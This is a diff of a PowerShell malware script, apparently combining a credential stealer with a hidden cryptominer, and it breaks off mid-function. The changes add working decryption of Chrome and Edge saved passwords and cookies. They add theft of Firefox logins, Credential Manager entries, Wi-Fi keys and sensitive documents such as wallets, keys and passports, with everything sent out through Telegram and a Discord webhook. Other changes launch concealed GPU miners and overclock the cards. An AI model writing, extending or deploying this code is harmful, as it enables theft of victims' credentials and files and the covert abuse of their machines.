@@ -17,6 +17,22 @@ public class KeyState {
 }
 "@
 
+# Logging function (moved to top)
+function Write-Log {
+    param ([string]$message)
+    $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    "$timestamp - $message" | Out-File -FilePath $logFile -Append
+    Write-Host "$timestamp - $message"
+}
+
+# Load System.Security for DPAPI decryption
+try {
+    Add-Type -AssemblyName System.Security
+    Write-Log "Loaded System.Security assembly for DPAPI decryption."
+} catch {
+    Write-Log "Failed to load System.Security assembly: $_ Falling back to encrypted data only."
+}
+
 # Define base directory and files
 $baseDir = "$env:APPDATA\AdvancedMiner"
 $miningScriptPath = "$baseDir\mining.ps1"
@@ -33,75 +49,6 @@ $sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
 
 # Add a flag for CPU mining
 $cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
-
-# Logging function
-function Write-Log {
-    param ([string]$message)
-    $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-    "$timestamp - $message" | Out-File -FilePath $logFile -Append
-    Write-Host "$timestamp - $message"
-}
-
-# Function to copy a file using Volume Shadow Copy Service (VSS) when it's locked
-function Copy-FileUsingVSS {
-    param (
-        [string]$sourceFile,
-        [string]$destinationFile
-    )
-    try {
-        # Get the volume (e.g., C:\) of the source file
-        $volume = [System.IO.Path]::GetPathRoot($sourceFile)
-
-        # Create a shadow copy
-        $shadow = (Get-WmiObject -Class Win32_ShadowCopy -List).Create($volume, "ClientAccessible")
-        if ($shadow.ReturnValue -ne 0) {
-            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
-        }
-
-        # Retrieve the shadow copy object
-        $shadowCopy = Get-WmiObject -Class Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
-        if (-not $shadowCopy) {
-            throw "Failed to retrieve shadow copy object."
-        }
-
-        # Construct the path to the file in the shadow copy
-        $shadowPath = $shadowCopy.DeviceObject
-        $relativePath = $sourceFile -replace [regex]::Escape($volume), ""
-        $shadowFilePath = "$shadowPath\$relativePath"
-
-        # Copy the file from the shadow copy
-        Copy-Item -Path $shadowFilePath -Destination $destinationFile -Force
-        Write-Log "Successfully copied $sourceFile to $destinationFile using VSS."
-
-        # Clean up the shadow copy
-        $shadowCopy.Delete()
-    } catch {
-        Write-Log "Failed to copy $sourceFile using VSS: $_"
-        throw
-    }
-}
-
-# Function to attempt direct file copy and fall back to VSS if the file is locked
-function Copy-LockedFile {
-    param (
-        [string]$source,
-        [string]$dest
-    )
-    try {
-        # Attempt direct copy
-        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
-        Write-Log "Copied $source to $dest directly."
-    } catch {
-        # Check if the error is due to the file being locked
-        if ($_.Exception -is [System.IO.IOException] -and $_.Exception.Message -like "*being used by another process*") {
-            Write-Log "Direct copy failed: $_ (file locked). Attempting VSS copy..."
-            Copy-FileUsingVSS -sourceFile $source -destinationFile $dest
-        } else {
-            Write-Log "Failed to copy $source: $_"
-            throw
-        }
-    }
-}
 
 # Create base directory if it doesn’t exist
 if (-not (Test-Path $baseDir)) {
@@ -185,6 +132,55 @@ $script:lastUpdateId = 0
 $script:currentAlgorithm = "Ethash"
 $script:lastSwitchTime = Get-Date
 
+# Function to copy a file using Volume Shadow Copy Service (VSS) when it's locked
+function Copy-FileUsingVSS {
+    param (
+        [string]$sourceFile,
+        [string]$destinationFile
+    )
+    try {
+        $volume = [System.IO.Path]::GetPathRoot($sourceFile)
+        $shadow = (Get-WmiObject -Class Win32_ShadowCopy -List).Create($volume, "ClientAccessible")
+        if ($shadow.ReturnValue -ne 0) {
+            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
+        }
+        $shadowCopy = Get-WmiObject -Class Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
+        if (-not $shadowCopy) {
+            throw "Failed to retrieve shadow copy object."
+        }
+        $shadowPath = $shadowCopy.DeviceObject
+        $relativePath = $sourceFile -replace [regex]::Escape($volume), ""
+        $shadowFilePath = "$shadowPath\$relativePath"
+        Copy-Item -Path $shadowFilePath -Destination $destinationFile -Force
+        Write-Log "Successfully copied ${sourceFile} to ${destinationFile} using VSS."
+        return $shadowCopy  # Return for later cleanup
+    } catch {
+        Write-Log "Failed to copy ${sourceFile} using VSS: $_"
+        throw
+    }
+}
+
+# Function to attempt direct file copy and fall back to VSS if the file is locked
+function Copy-LockedFile {
+    param (
+        [string]$source,
+        [string]$dest
+    )
+    try {
+        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
+        Write-Log "Copied ${source} to ${dest} directly."
+        return $null  # No shadow copy to clean up
+    } catch {
+        if ($_.Exception -is [System.IO.IOException] -and $_.Exception.Message -like "*being used by another process*") {
+            Write-Log "Direct copy failed: $_ (file locked). Attempting VSS copy..."
+            return Copy-FileUsingVSS -sourceFile $source -destinationFile $dest
+        } else {
+            Write-Log "Failed to copy ${source}: $_"
+            throw
+        }
+    }
+}
+
 # Helper function to convert hex blob to byte array
 function Convert-HexBlobToByteArray {
     param ([string]$blob)
@@ -266,6 +262,7 @@ function Send-DiscordWebhook {
     $body = @{ content = $message } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
+        Start-Sleep -Seconds 1  # Mitigate rate limiting
     } catch {
         Write-Log "Discord send failed: $_"
     }
@@ -283,10 +280,15 @@ function Get-ChromeEncryptionKey {
         $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
         $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
-        Write-Log "Encryption key retrieved (decryption skipped due to missing ProtectedData)."
-        return $encryptedKey
+        if ($PSVersionTable.PSVersion.Major -ge 6) {
+            Write-Log "PowerShell Core detected; DPAPI decryption not fully supported. Returning encrypted key."
+            return $encryptedKey
+        }
+        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        Write-Log "Encryption key successfully decrypted."
+        return $decryptedKey
     } catch {
-        Write-Log "Failed to retrieve Chrome encryption key: $_"
+        Write-Log "Failed to retrieve or decrypt Chrome encryption key: $_"
         return $null
     }
 }
@@ -296,8 +298,20 @@ function Decrypt-ChromePassword {
         [byte[]]$encryptedData,
         [byte[]]$key
     )
-    Write-Log "Password decryption skipped; returning encrypted data."
-    return [Convert]::ToBase64String($encryptedData)
+    try {
+        $nonce = $encryptedData[0..11]
+        $cipherText = $encryptedData[12..($encryptedData.Length - 17)]
+        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
+        $aes = [System.Security.Cryptography.AesGcm]::new($key)
+        $plainTextBytes = New-Object byte[] $cipherText.Length
+        $aes.Decrypt($nonce, $cipherText, $tag, $plainTextBytes)
+        $plainText = [System.Text.Encoding]::UTF8.GetString($plainTextBytes)
+        Write-Log "Password decrypted successfully."
+        return $plainText
+    } catch {
+        Write-Log "Decryption failed: $_"
+        return [Convert]::ToBase64String($encryptedData)
+    }
 }
 
 function Get-ChromeCredentials {
@@ -326,7 +340,22 @@ function Get-ChromeCredentials {
             $url = $fields[0]
             $username = $fields[1]
             $passwordValue = $fields[2]
-            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
+            if ($passwordValue -match "^v10") {
+                $encryptedData = [System.Text.Encoding]::UTF8.GetBytes($passwordValue.Substring(3))
+                $password = Decrypt-ChromePassword -encryptedData $encryptedData -key $encryptionKey
+                $credential = [PSCustomObject]@{
+                    Source = "Chrome"
+                    URL = $url
+                    Username = $username
+                    Password = $password
+                    Timestamp = (Get-Date).ToString()
+                }
+                $credentials += $credential
+                $message = "Chrome - URL: $url, User: $username, Pass: $password"
+                Send-TelegramMessage -message $message
+                Send-DiscordWebhook -message $message
+                Write-Log "Extracted and decrypted credential for $url"
+            } elseif ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
                 $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
                 if ($byteArray) {
                     $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
@@ -334,19 +363,19 @@ function Get-ChromeCredentials {
                         Source = "Chrome"
                         URL = $url
                         Username = $username
-                        Password = $password  # Encrypted as base64
+                        Password = $password
                         Timestamp = (Get-Date).ToString()
                     }
                     $credentials += $credential
-                    $message = "Chrome - URL: $url, User: $username, Pass (encrypted): $password"
+                    $message = "Chrome - URL: $url, User: $username, Pass: $password"
                     Send-TelegramMessage -message $message
                     Send-DiscordWebhook -message $message
-                    Write-Log "Extracted credential for $url (password encrypted)"
+                    Write-Log "Extracted credential for $url (hex blob format)"
                 } else {
                     Write-Log "Invalid hex blob for password at $url"
                 }
             } else {
-                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
+                Write-Log "Password for $url is in an unrecognized format: $passwordValue"
             }
         }
         $credentials | ConvertTo-Json | Out-File $credentialsFile
@@ -383,7 +412,22 @@ function Get-EdgeCredentials {
             $url = $fields[0]
             $username = $fields[1]
             $passwordValue = $fields[2]
-            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
+            if ($passwordValue -match "^v10") {
+                $encryptedData = [System.Text.Encoding]::UTF8.GetBytes($passwordValue.Substring(3))
+                $password = Decrypt-ChromePassword -encryptedData $encryptedData -key $encryptionKey
+                $credential = [PSCustomObject]@{
+                    Source = "Edge"
+                    URL = $url
+                    Username = $username
+                    Password = $password
+                    Timestamp = (Get-Date).ToString()
+                }
+                $credentials += $credential
+                $message = "Edge - URL: $url, User: $username, Pass: $password"
+                Send-TelegramMessage -message $message
+                Send-DiscordWebhook -message $message
+                Write-Log "Extracted Edge credential for $url"
+            } elseif ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
                 $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
                 if ($byteArray) {
                     $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
@@ -391,19 +435,19 @@ function Get-EdgeCredentials {
                         Source = "Edge"
                         URL = $url
                         Username = $username
-                        Password = $password  # Encrypted as base64
+                        Password = $password
                         Timestamp = (Get-Date).ToString()
                     }
                     $credentials += $credential
-                    $message = "Edge - URL: $url, User: $username, Pass (encrypted): $password"
+                    $message = "Edge - URL: $url, User: $username, Pass: $password"
                     Send-TelegramMessage -message $message
                     Send-DiscordWebhook -message $message
-                    Write-Log "Extracted Edge credential for $url (password encrypted)"
+                    Write-Log "Extracted Edge credential for $url (hex blob format)"
                 } else {
                     Write-Log "Invalid hex blob for password at $url"
                 }
             } else {
-                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
+                Write-Log "Password for $url is not in expected format: $passwordValue"
             }
         }
         $credentials | ConvertTo-Json | Out-File $credentialsFile
@@ -465,62 +509,244 @@ function Get-ChromeHistory {
 function Get-ChromeCookies {
     $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
     $tempCookies = "$env:TEMP\ChromeCookies.db"
+    $cookiesOutputFile = "$env:TEMP\ChromeCookies.txt"
     if (-not (Test-Path $cookiesPath)) {
         Write-Log "Chrome Cookies not found at $cookiesPath."
         return
     }
+    $shadowCopy = $null
     try {
-        Copy-LockedFile -source $cookiesPath -dest $tempCookies
+        $retryCount = 0
+        $maxRetries = 3
+        $fileCopied = $false
+        do {
+            try {
+                $shadowCopy = Copy-LockedFile -source $cookiesPath -dest $tempCookies
+                Write-Log "Copied Chrome cookies database to $tempCookies."
+                $fileCopied = $true
+            } catch {
+                Write-Log "Copy attempt $($retryCount + 1) failed: $_"
+                Start-Sleep -Seconds 1
+                $retryCount++
+            }
+        } while (-not $fileCopied -and $retryCount -lt $maxRetries)
+
+        if (-not $fileCopied) {
+            Write-Log "Failed to copy $cookiesPath after $maxRetries attempts."
+            return
+        }
+
+        $retryCount = 0
+        $fileExists = $false
+        do {
+            Start-Sleep -Milliseconds 1000
+            if (Test-Path $tempCookies) {
+                $fileExists = $true
+                $fileInfo = Get-Item $tempCookies -ErrorAction Stop
+                Write-Log "Verified $tempCookies exists with size: $($fileInfo.Length) bytes."
+            } else {
+                Write-Log "Retry $($retryCount + 1): $tempCookies not found."
+                $retryCount++
+            }
+        } while (-not $fileExists -and $retryCount -lt $maxRetries)
+
+        if (-not $fileExists) {
+            Write-Log "Copied file $tempCookies still does not exist after retries."
+            return
+        }
+
+        if ($fileInfo.Length -eq 0) {
+            Write-Log "Copied file $tempCookies is empty (size: 0 bytes)."
+            return
+        }
+
         $query = "SELECT host_key, name, encrypted_value FROM cookies"
-        $output = & "$baseDir\sqlite3.exe" $tempCookies $query -separator '|'
+        $rawOutput = & "$baseDir\sqlite3.exe" $tempCookies $query -separator '|' 2>&1
+        if ($LASTEXITCODE -ne 0 -or $rawOutput -eq $null -or $rawOutput.Count -eq 0) {
+            Write-Log "SQLite query failed or returned no data. Exit code: $LASTEXITCODE, Output: $rawOutput"
+            return
+        }
+        Write-Log "Raw SQLite output retrieved: $($rawOutput.Count) lines."
+
         $encryptionKey = Get-ChromeEncryptionKey
         if (-not $encryptionKey) {
             Write-Log "Failed to get encryption key."
-            Remove-Item $tempCookies -ErrorAction SilentlyContinue
             return
         }
+
         $cookieEntries = @()
         if (Test-Path $cookiesFile) {
             $cookies = Get-Content $cookiesFile | ConvertFrom-Json
         } else {
             $cookies = @()
         }
-        foreach ($line in $output) {
-            $fields = $line -split '\|'
-            $host = $fields[0]
-            $name = $fields[1]
-            $encryptedValue = $fields[2]
-            if ($encryptedValue -match "^X'([0-9A-Fa-f]+)'$") {
-                $byteArray = Convert-HexBlobToByteArray -blob $encryptedValue
-                if ($byteArray) {
-                    $value = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
-                    $entry = "Host: $host, Name: $name, Value (encrypted): $value"
-                    $cookieEntries += $entry
-                    $cookies += [PSCustomObject]@{
-                        Host = $host
-                        Name = $name
-                        Value = $value  # Encrypted as base64
-                        Timestamp = (Get-Date).ToString()
+        $cookieText = "Chrome Cookies:`n"
+
+        foreach ($line in $rawOutput) {
+            if ($line -is [string] -and $line -notmatch "Error") {
+                $fields = $line -split '\|'
+                if ($fields.Count -ge 3) {
+                    $host = $fields[0]
+                    $name = $fields[1]
+                    $encryptedValue = $fields[2]
+                    Write-Log "Processing cookie - Host: $host, Name: $name"
+
+                    if ($encryptedValue -match "^v10") {
+                        $encryptedData = [System.Text.Encoding]::UTF8.GetBytes($encryptedValue.Substring(3))
+                        $value = Decrypt-ChromePassword -encryptedData $encryptedData -key $encryptionKey
+                        $entry = "Host: $host, Name: $name, Value: $value"
+                        $cookieEntries += $entry
+                        $cookieText += "$entry`n"
+                        $cookies += [PSCustomObject]@{
+                            Host = $host
+                            Name = $name
+                            Value = $value
+                            Timestamp = (Get-Date).ToString()
+                        }
+                        Write-Log "Added v10 cookie entry for $host"
+                    } elseif ($encryptedValue -match "^X'([0-9A-Fa-f]+)'$") {
+                        $byteArray = Convert-HexBlobToByteArray -blob $encryptedValue
+                        if ($byteArray) {
+                            $value = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
+                            $entry = "Host: $host, Name: $name, Value: $value"
+                            $cookieEntries += $entry
+                            $cookieText += "$entry`n"
+                            $cookies += [PSCustomObject]@{
+                                Host = $host
+                                Name = $name
+                                Value = $value
+                                Timestamp = (Get-Date).ToString()
+                            }
+                            Write-Log "Added hex blob cookie entry for $host"
+                        } else {
+                            Write-Log "Invalid hex blob for cookie value: $encryptedValue"
+                        }
+                    } else {
+                        Write-Log "Cookie value not in expected format: $encryptedValue"
+                        $cookieText += "Host: $host, Name: $name, Value (raw): $encryptedValue`n"
                     }
                 } else {
-                    Write-Log "Invalid hex blob for cookie value: $encryptedValue"
+                    Write-Log "Malformed SQLite output line: $line"
                 }
-            } else {
-                Write-Log "Cookie value not in expected hex blob format: $encryptedValue"
             }
         }
+
+        if ($cookieEntries.Count -eq 0) {
+            Write-Log "No valid cookies found in database."
+            $cookieText += "No cookies retrieved.`n"
+        }
+
         $cookies | ConvertTo-Json | Out-File $cookiesFile
+        $cookieText | Out-File -FilePath $cookiesOutputFile -Encoding UTF8
+        Send-TelegramFile -filePath $cookiesOutputFile
+        Send-DiscordWebhook -message "Exfiltrated Chrome cookies file: $cookiesOutputFile"
+        Write-Log "Chrome cookies saved to $cookiesOutputFile and exfiltrated."
+
         for ($i = 0; $i -lt $cookieEntries.Count; $i += 5) {
             $batch = $cookieEntries[$i..($i + 4)] -join "`n"
             $batchMessage = "Chrome Cookies Batch $($i/5 + 1):`n$batch"
             Send-TelegramMessage -message $batchMessage
             Send-DiscordWebhook -message $batchMessage
         }
-        Write-Log "Sent Chrome cookies."
+        Write-Log "Sent Chrome cookies in batches ($($cookieEntries.Count) entries)."
     } catch {
         Write-Log "Failed to process Chrome cookies: $_"
     } finally {
+        if ($shadowCopy) {
+            $shadowCopy.Delete()
+            Write-Log "Shadow copy deleted."
+        }
         Remove-Item $tempCookies -ErrorAction SilentlyContinue
+        Remove-Item $cookiesOutputFile -ErrorAction SilentlyContinue
+    }
+}
+
+function Get-FirefoxCredentials {
+    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (-not (Test-Path $firefoxProfilePath)) {
+        Write-Log "Firefox profile directory not found at $firefoxProfilePath."
+        return
+    }
+    $profileDir = Get-ChildItem -Path $firefoxProfilePath -Directory | Select-Object -First 1
+    if (-not $profileDir) {
+        Write-Log "No Firefox profile found."
+        return
+    }
+    $loginsFile = "$($profileDir.FullName)\logins.json"
+    $keyDbFile = "$($profileDir.FullName)\key4.db"
+    $tempLogins = "$env:TEMP\FirefoxLogins.json"
+    $tempKeyDb = "$env:TEMP\FirefoxKey4.db"
+    $outputFile = "$env:TEMP\FirefoxCredentials.txt"
+    if (-not (Test-Path $loginsFile) -or -not (Test-Path $keyDbFile)) {
+        Write-Log "Firefox logins.json or key4.db not found in $($profileDir.FullName)."
+        return
+    }
+    try {
+        Copy-LockedFile -source $loginsFile -dest $tempLogins
+        Copy-LockedFile -source $keyDbFile -dest $tempKeyDb
+        $logins = Get-Content $tempLogins | ConvertFrom-Json
+        $credentialsText = "Firefox Credentials:`n"
+        foreach ($login in $logins.logins) {
+            $url = $login.hostname
+            $username = $login.encryptedUsername
+            $password = $login.encryptedPassword
+            $credentialsText += "URL: $url, Username (encrypted): $username, Password (encrypted): $password`n"
+            Write-Log "Extracted Firefox credential for $url (encrypted data)"
+        }
+        $credentialsText | Out-File -FilePath $outputFile -Encoding UTF8
+        Send-TelegramFile -filePath $outputFile
+        Send-DiscordWebhook -message "Exfiltrated Firefox credentials file: $outputFile"
+        Write-Log "Firefox credentials saved to $outputFile and exfiltrated."
+    } catch {
+        Write-Log "Failed to process Firefox credentials: $_"
+    } finally {
+        Remove-Item $tempLogins -ErrorAction SilentlyContinue
+        Remove-Item $tempKeyDb -ErrorAction SilentlyContinue
+        Remove-Item $outputFile -ErrorAction SilentlyContinue
+    }
+}
+
+function Get-WinCredManCredentials {
+    Write-Log "Extracting Windows Credential Manager credentials..."
+    $outputFile = "$env:TEMP\WinCredMan.txt"
+    try {
+        $credList = cmdkey /list
+        $credentialsText = "Windows Credential Manager Credentials:`n"
+        $credentialsText += ($credList | Out-String)
+        $credentialsText | Out-File -FilePath $outputFile -Encoding UTF8
+        Send-TelegramFile -filePath $outputFile
+        Send-DiscordWebhook -message "Exfiltrated Windows Credential Manager data: $outputFile"
+        Write-Log "Windows Credential Manager data saved to $outputFile and exfiltrated."
+    } catch {
+        Write-Log "Failed to extract Windows Credential Manager credentials: $_"
+    } finally {
+        Remove-Item $outputFile -ErrorAction SilentlyContinue
+    }
+}
+
+function Get-WiFiPasswords {
+    Write-Log "Extracting saved Wi-Fi passwords..."
+    $outputFile = "$env:TEMP\WiFiPasswords.txt"
+    try {
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line -replace ".*: " }
+        $wifiText = "Saved Wi-Fi Passwords:`n"
+        foreach ($profile in $profiles) {
+            $details = netsh wlan show profile name="$profile" key=clear
+            $ssid = ($details | Select-String "SSID name" | ForEach-Object { $_.Line -replace ".*: `"|`" " }).Trim()
+            $password = ($details | Select-String "Key Content" | ForEach-Object { $_.Line -replace ".*: " }).Trim()
+            if ($password) {
+                $wifiText += "SSID: $ssid, Password: $password`n"
+                Write-Log "Extracted Wi-Fi password for SSID: $ssid"
+            }
+        }
+        $wifiText | Out-File -FilePath $outputFile -Encoding UTF8
+        Send-TelegramFile -filePath $outputFile
+        Send-DiscordWebhook -message "Exfiltrated Wi-Fi passwords file: $outputFile"
+        Write-Log "Wi-Fi passwords saved to $outputFile and exfiltrated."
+    } catch {
+        Write-Log "Failed to extract Wi-Fi passwords: $_"
+    } finally {
+        Remove-Item $outputFile -ErrorAction SilentlyContinue
     }
 }
 
@@ -592,16 +818,52 @@ function Capture-Webcam {
 }
 
 function Exfiltrate-Files {
-    Write-Log "Starting file exfiltration..."
-    $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
-    $fileCount = $targetFiles.Count
-    Write-Log "Found $fileCount files to exfiltrate."
-    foreach ($file in $targetFiles) {
-        Send-TelegramFile -filePath $file.FullName
-        Send-DiscordWebhook -message "Exfiltrated file: $($file.Name)"
-        Write-Log "Exfiltrated file: $($file.FullName)"
+    Write-Log "Starting targeted file exfiltration..."
+    $targetDirs = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads"
+    )
+    $importantPatterns = @(
+        "*password*",
+        "*credential*",
+        "*key*",
+        "*wallet*",
+        "*bank*",
+        "*statement*",
+        "*invoice*",
+        "*passport*",
+        "*id*",
+        "*resume*",
+        "*.pem",
+        "*.key",
+        "*.dat",
+        "*.config",
+        "*.ini"
+    )
+    $targetFiles = @()
+    foreach ($dir in $targetDirs) {
+        if (Test-Path $dir) {
+            foreach ($pattern in $importantPatterns) {
+                $targetFiles += Get-ChildItem -Path $dir -File -Recurse -Include $pattern -ErrorAction SilentlyContinue
+            }
+        } else {
+            Write-Log "Directory not found: $dir"
+        }
     }
-    Write-Log "File exfiltration completed."
+    $targetFiles = $targetFiles | Sort-Object FullName -Unique
+    $fileCount = $targetFiles.Count
+    Write-Log "Found $fileCount important files to exfiltrate."
+    foreach ($file in $targetFiles) {
+        try {
+            Send-TelegramFile -filePath $file.FullName
+            Send-DiscordWebhook -message "Exfiltrated important file: $($file.Name)"
+            Write-Log "Exfiltrated important file: $($file.FullName)"
+        } catch {
+            Write-Log "Failed to exfiltrate ${file.FullName}: $_"
+        }
+    }
+    Write-Log "Targeted file exfiltration completed."
 }
 
 function Start-ClipboardHijacking {
@@ -627,8 +889,8 @@ function Get-MostProfitableCoin {
         $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10
         $coins = $profitData.coins | Where-Object { $_.algorithm -in $supportedAlgorithms.Keys }
         if (-not $coins) {
-            Write-Log "No profitable coins found for supported algorithms."
-            return $null
+            Write-Log "No profitable coins found for supported algorithms. Using default Ethash."
+            return [PSCustomObject]@{ tag = "ETH"; algorithm = "Ethash"; profitability = 1 }
         }
         $bestCoin = $coins | ForEach-Object {
             $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru
@@ -636,8 +898,8 @@ function Get-MostProfitableCoin {
         Write-Log "Most profitable coin: $($bestCoin.tag) with algorithm $($bestCoin.algorithm)"
         return $bestCoin
     } catch {
-        Write-Log "Failed to fetch profitability data: $_"
-        return $null
+        Write-Log "Failed to fetch profitability data: $_ Using default Ethash."
+        return [PSCustomObject]@{ tag = "ETH"; algorithm = "Ethash"; profitability = 1 }
     }
 }
 
@@ -663,6 +925,8 @@ function Set-NvidiaOverclock {
         & $nvidiaSmi -lgc $coreOffset
         & $nvidiaSmi -lmc $memOffset
         Write-Log "Applied NVIDIA overclock: Power $powerLimit W, Core +$coreOffset MHz, Mem +$memOffset MHz"
+    } else {
+        Write-Log "NVIDIA-SMI not found; overclocking skipped."
     }
 }
 
@@ -672,6 +936,8 @@ function Set-AmdOverclock {
     if (Test-Path $overdriveToolPath) {
         & $overdriveToolPath -p1$profile
         Write-Log "Applied AMD overclock profile: $profile"
+    } else {
+        Write-Log "OverdriveNTool not found; overclocking skipped."
     }
 }
 
@@ -683,8 +949,8 @@ function Install-Miner {
         if (-not (Test-Path $exePath)) {
             Download-Miner -miner $miner -url $url -path $path
         }
-        Write-Log "Miner ready at $exePath."
-        return "$miner.exe"
+        Write-Log "Miner $miner ready at $exePath."
+        return $exePath
     } catch {
         Write-Log "Install-Miner ($miner) failed: $_"
         return $null
@@ -698,8 +964,15 @@ function Start-Miner {
         [int]$gpuIndex = -1
     )
     $miner = $supportedAlgorithms[$algorithm]
+    if (-not $miner) {
+        Write-Log "No miner found for algorithm $algorithm in supported algorithms."
+        return $null
+    }
     $exePath = "$baseDir\$miner\$miner.exe"
-    if (-not (Test-Path $exePath)) { return $null }
+    if (-not (Test-Path $exePath)) {
+        Write-Log "Miner executable not found at $exePath for $miner."
+        return $null
+    }
     $args = switch ($algorithm) {
         "Ethash" { "-a ethash -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x --api-bind-http 127.0.0.1:4067" }
         "KawPow" { "-a kawpow -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
@@ -709,10 +982,16 @@ function Start-Miner {
     if ($gpuIndex -ge 0) { $args += " --devices $gpuIndex" }
     try {
         $process = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 5  # Give miner time to start
+        if ($process.HasExited) {
+            Write-Log "$miner (PID: $($process.Id)) failed to start or exited immediately for $algorithm."
+            return $null
+        }
         Write-Log "$miner started (PID: $($process.Id)) for $algorithm."
         return $process
     } catch {
-        Write-Log "Failed to start $($miner): $_"
+        Write-Log "Failed to start ${miner}: $_"
+        return $null
     }
 }
 
@@ -723,13 +1002,20 @@ function Stop-Miner {
 
 function Monitor-Miner {
     while ($true) {
-        if (-not (Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue)) {
+        $runningMiners = Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue
+        if (-not $runningMiners) {
             Write-Log "Miners not running. Restarting..."
             $bestCoin = Get-MostProfitableCoin
             if ($bestCoin) {
                 $pool = Get-BestPool -algorithm $bestCoin.algorithm
-                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
+                $gpus = @(Get-CimInstance Win32_VideoController)
+                foreach ($gpu in $gpus) {
+                    $gpuIndex = $gpus.IndexOf($gpu)
+                    Start-Miner -algorithm $bestCoin.algorithm -pool $pool -gpuIndex $gpuIndex
+                }
             }
+        } else {
+            Write-Log "Miners running: $($runningMiners.Name -join ', ')"
         }
         Start-Sleep -Seconds 300
     }
@@ -746,7 +1032,11 @@ function Switch-Coin {
     if ($algorithm) {
         Stop-Miner
         $pool = Get-BestPool -algorithm $algorithm
-        Start-Miner -algorithm $algorithm -pool $pool
+        $gpus = @(Get-CimInstance Win32_VideoController)
+        foreach ($gpu in $gpus) {
+            $gpuIndex = $gpus.IndexOf($gpu)
+            Start-Miner -algorithm $algorithm -pool $pool -gpuIndex $gpuIndex
+        }
         $script:currentAlgorithm = $algorithm
     }
 }
@@ -909,27 +1199,93 @@ function Get-TelegramCommands {
     }
 }
 
+# **Main Mining Initialization Function**
+
+function Initialize-Miners {
+    $worker = $env:COMPUTERNAME
+    Write-Log "Initializing miners on $worker..."
+    try {
+        $gpuType = Test-GPUCompatibility
+        if (-not $gpuType) { 
+            Write-Log "No compatible GPU detected. Exiting."
+            Send-TelegramMessage -message "No compatible GPU detected. Mining aborted."
+            exit 1 
+        }
+
+        # Install miners
+        $miners = @(
+            @{ Name = "t-rex"; Url = "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"; Path = "$baseDir\T-Rex" },
+            @{ Name = "nbminer"; Url = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip"; Path = "$baseDir\NBMiner" },
+            @{ Name = "xmrig"; Url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"; Path = "$baseDir\XMRig" },
+            @{ Name = "lolminer"; Url = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip"; Path = "$baseDir\lolMiner" }
+        )
+
+        foreach ($miner in $miners) {
+            $exePath = Install-Miner -miner $miner.Name -url $miner.Url -path $miner.Path
+            if (-not $exePath) {
+                Write-Log "Failed to install $($miner.Name). Aborting mining initialization."
+                Send-TelegramMessage -message "Failed to install $($miner.Name). Mining aborted."
+                exit 1
+            }
+        }
+
+        # Start miners
+        $bestCoin = Get-MostProfitableCoin
+        if (-not $bestCoin -or -not $bestCoin.algorithm) {
+            Write-Log "Invalid coin data returned: $bestCoin. Forcing Ethash."
+            $bestCoin = [PSCustomObject]@{ tag = "ETH"; algorithm = "Ethash"; profitability = 1 }
+        }
+        Write-Log "Selected coin: $($bestCoin.tag) with algorithm $($bestCoin.algorithm)"
+
+        $pool = Get-BestPool -algorithm $bestCoin.algorithm
+        $gpus = @(Get-CimInstance Win32_VideoController)
+        if ($gpuType -eq "NVIDIA") { Set-NvidiaOverclock }
+        elseif ($gpuType -eq "AMD") { Set-AmdOverclock }
+
